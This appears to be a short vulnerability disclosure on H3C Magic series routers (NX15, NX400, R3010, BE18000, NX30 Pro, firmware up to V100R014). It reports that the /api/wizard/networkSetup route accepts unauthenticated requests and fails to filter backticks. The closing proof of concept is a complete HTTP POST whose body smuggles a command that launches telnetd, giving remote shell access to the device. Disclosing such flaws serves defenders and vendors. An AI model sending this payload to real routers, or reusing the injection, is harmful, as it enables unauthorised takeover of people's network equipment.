## Information

**Vendor of the products:** H3C Technologies Co., Ltd.

**Vendor's website:** https://www.h3c.com/

**Reported by:** Guan Qing Wen(2144987805@qq.com)

**Affected products:** H3C Magic NX15\H3C NX400\H3C Magic R3010\H3C Magic BE18000\H3C Magic NX30 Pro

**Affected firmware version:** <=V100R014 (Taking NX15 as an example.)

**Firmware download address:** [H3C NX15V100R014](https://www.h3c.com/cn/d_202409/2263952_30005_0.htm)

## Overview

In the `H3C` `Magic` series products, including `H3C Magic NX15`, `H3C NX400`, `H3C Magic R3010`, `H3C Magic BE18000`, and `H3C Magic NX30 Pro`, an attacker can send a specially crafted `POST` packet to the `/api/wizard/networkSetup` route without authorization, allowing them to obtain the highest privileges on the device.

## Vulnerability details

In the `api` file, the `FCGI_WizardProcess` function contains the `/wizard/networkSetup` route, which can trigger the corresponding handler function



![image-20250314125647586](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250314125647586.png)



Due to the failure to filter backticks as dangerous characters, command injection occurs

![image-20250314125713058](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/image-20250314125713058.png)

## Poc

```
POST /api/wizard/networkSetup HTTP/1.1
Host: 192.168.124.1
Content-Length: 11
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Origin: http://192.168.124.1
Referer: http://192.168.124.1/home
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

'`telnetd`'
```
